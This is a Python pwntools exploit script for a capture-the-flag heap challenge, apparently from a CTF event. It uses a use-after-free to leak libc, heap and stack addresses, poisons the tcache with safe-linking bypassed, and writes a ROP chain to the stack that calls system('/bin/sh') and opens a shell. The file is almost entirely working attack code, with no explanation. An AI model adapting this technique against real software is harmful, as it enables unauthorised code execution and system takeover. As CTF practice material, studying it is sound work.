#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 8010
HOST = "chal1.fwectf.com"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.39.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x00000000004013CC
            b* 0x0000000000401458
            b* 0x00000000004014FC
            b* 0x00000000004016C0
            b* 0x00000000004015E8
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, size, data = b'abcd'):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)

def free(idx):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'Index: ', str(idx))

def edit(idx, data):
    p.sendlineafter(b'> ', str(3))
    p.sendlineafter(b'Index: ', str(idx))
    p.sendafter(b'Data: ', data)

def show(idx):
    p.sendlineafter(b'> ', str(4))
    p.sendlineafter(b'Index: ', str(idx))

# VARIABLE


# PAYLOAD
add(0, 0x500)
add(1, 0x30)
add(2, 0x30)
add(3, 0x30)
free(0)
show(0)
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x203b20
log.info("Libc base: " + hex(libc.address))

free(2)
show(2)
heap_base = u32(p.recv(3) + b'\0') << 12
log.info("Heap base: " + hex(heap_base))
free(1)
target = (libc.sym.environ - 0x18) ^ ((heap_base + 0x7b0) >> 12)
edit(1, p64(target))
add(4, 0x30)
add(5, 0x30, b'a'*0x18)
show(5)
p.recvuntil(b'a'*0x18)
stack_leak = u64(p.recv(6) + b'\0'*2)
log.info("Stack leak: " + hex(stack_leak))

free(4)
free(3)
target = (stack_leak - 0x158) ^ ((heap_base + 0x830) >> 12)
edit(3, p64(target))
add(6, 0x30)

pop_rdi = 0x000000000010f75b + libc.address
ret = 0x000000000002882f + libc.address
payload = flat(
    b'a'*8,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    libc.sym.system
    )
# GDB()
add(7, 0x30, payload)

p.interactive()